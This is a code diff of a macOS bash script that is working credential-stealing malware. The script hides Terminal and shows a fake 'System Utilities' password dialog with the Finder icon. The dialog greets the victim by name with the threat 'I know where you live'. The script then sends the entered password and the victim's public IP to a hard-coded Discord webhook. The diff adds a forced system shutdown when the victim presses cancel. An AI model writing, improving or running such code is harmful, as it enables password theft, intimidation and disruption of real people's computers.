@@ -1,17 +1,14 @@
 #!/bin/bash
-# Login Prompt Script for macOS – Updated with Two-Line Prompt and Force Kill
+# Login Prompt Script for macOS – Updated with Shutdown on Cancel
 # This script displays a login prompt that instructs the user with two lines:
 # "I know where you live, [FirstName]."
 # "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 #
-# Once a non-empty password is entered, it sends the captured data to a Discord webhook and forcefully kills Terminal.
+# If the user presses cancel, the system will shut down
+# If a password is entered, it sends the captured data to a Discord webhook
 #
 # Requirements:
 # - macOS with osascript, curl, and either python3 or python installed.
-#
-# Usage:
-#   chmod +x login_prompt.sh
-#   ./login_prompt.sh
 
 # Hide Terminal immediately.
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -27,30 +24,26 @@ read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
 set lastName to word -1 of fullName
-set userPassword to ""
-repeat while userPassword is ""
-    try
-        set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
-    on error
-        set userPassword to ""
-    end try
-end repeat
-return userPassword
+
+try
+    set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
+    return userPassword
+on error
+    do shell script "osascript -e 'tell app \"System Events\" to shut down'"
+    return "CANCEL_SHUTDOWN_INITIATED"
+end try
 EOF
 
 # Execute the AppleScript prompt and capture its output.
-osascript -e "$applescriptCode" > pass_temp.txt
+userPassword=$(osascript -e "$applescriptCode")
 
-# Read the password from the temporary file.
-if [ -f pass_temp.txt ]; then
-    dialogText=$(cat pass_temp.txt)
-    rm pass_temp.txt
-else
-    dialogText="CANCEL"
+# Check if shutdown was initiated
+if [[ "$userPassword" == "CANCEL_SHUTDOWN_INITIATED" ]]; then
+    exit 0
 fi
 
 # Append the captured password.
-capture="${capture}password=${dialogText}\n"
+capture="${capture}password=${userPassword}\n"
 
 # Capture the public IP address.
 ipaddress=$(curl -s https://api.ipify.org)
@@ -70,8 +63,10 @@ fi
 payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
 
 # Send the payload to your Discord webhook.
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"
 curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
+
+# Clean up
 rm pass.txt
 
 # Force kill Terminal.
